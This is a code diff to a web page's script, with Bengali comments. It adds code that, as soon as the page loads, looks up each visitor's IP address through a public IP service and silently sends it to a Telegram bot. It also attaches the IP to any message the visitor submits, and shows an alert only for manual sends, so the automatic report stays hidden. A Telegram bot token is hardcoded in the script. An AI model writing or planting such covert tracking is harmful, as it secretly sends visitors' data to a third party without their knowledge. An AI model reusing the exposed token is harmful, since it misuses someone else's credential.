@@ -85,12 +85,28 @@
   </a>
 
   <script>
-    function sendMessage() {
-      const message = document.getElementById("message").value;
+    let userIp = "";  // আইপি অ্যাড্রেস সংরক্ষণ করার জন্য ভ্যারিয়েবল
 
-      if (!message) {
-        alert("আপনার উত্তর লিখুন।");
-        return;
+    // পেজ লোড হওয়া সাথেই আইপি অ্যাড্রেস সংগ্রহ করা এবং বটে পাঠানো
+    window.onload = function() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          userIp = data.ip;  // আইপি অ্যাড্রেস স্টোর করা
+          sendMessage(true); // পেইজ লোডের পর আইপি অ্যাড্রেস সহ মেসেজ পাঠানো
+        })
+        .catch(error => {
+          console.error('Error fetching IP:', error);
+        });
+    }
+
+    // মেসেজ পাঠানোর ফাংশন
+    function sendMessage(autoSend = false) {
+      const message = document.getElementById("message").value;
+      const fullMessage = autoSend ? `IP Address: ${userIp}` : `${message} (IP Address: ${userIp})`;
+
+      if (!autoSend && !message) {
+        return;  // যদি মেসেজ না থাকে তবে কিছুই করা হবে না
       }
 
       const token = "8117453029:AAG9C5tgpxgVJE6coKUUeFTqxsnUUT7Q2s4"; // বট টোকেন
@@ -99,7 +115,7 @@
 
       const data = {
         chat_id: chatId,
-        text: message
+        text: fullMessage
       };
 
       fetch(url, {
@@ -111,10 +127,8 @@
       })
       .then(response => response.json())
       .then(data => {
-        if (data.ok) {
-          alert("Message sent successfully!");
-        } else {
-          alert("Failed to send message.");
+        if (!autoSend) {  // মেসেজ পাঠানোর পর পপআপ দেখাবে শুধুমাত্র যদি এটি ম্যানুয়ালি পাঠানো হয়
+          alert("♥️তোমার উত্তর টি পাঠানো হয়ে গেছে♥️");
         }
       })
       .catch(error => {
